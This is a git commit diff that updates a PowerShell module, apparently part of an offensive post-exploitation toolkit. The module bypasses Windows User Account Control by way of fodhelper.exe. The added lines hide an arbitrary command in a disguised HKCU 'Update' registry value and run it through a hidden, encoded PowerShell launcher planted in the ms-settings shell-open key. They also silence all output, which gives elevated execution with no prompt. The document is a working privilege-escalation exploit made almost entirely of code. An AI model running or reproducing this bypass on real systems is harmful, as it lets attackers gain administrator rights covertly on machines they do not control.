72380faf1d5bab63698ddfeb4d24f7b70e55cde8
cybervaca <cybervaca@gmail.com>
2017-08-01 09:15:02 +0200

    Update BypassUAC-Fodhelper.ps1

--- data/module_source/privesc/BypassUAC-Fodhelper.ps1
+++ data/module_source/privesc/BypassUAC-Fodhelper.ps1
@@ -1,12 +1,15 @@
 function FodhelperBypass{ 
  Param ([String]$comando)
 
-$comando = "c:\Windows\System32\WindowsPowerShell\v1.0\" + $comando
+    New-Item -path registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\Update -force | Out-Null
+    Set-ItemProperty -path registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\Update -name 'Update' -Value $comando -Force | Out-Null
+    $comando = 'powershell.exe -NoP -NonI -c $x=$((gp HKCU:Software\Microsoft\Windows\Update).Update); powershell -NoP -NonI -W Hidden -enc $x'
+    
 
     #Create registry structure
-    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
-    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
-    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $comando -Force
+    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
+    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
+    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $comando -Force | Out-Null
 
     #Perform the bypass
     Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
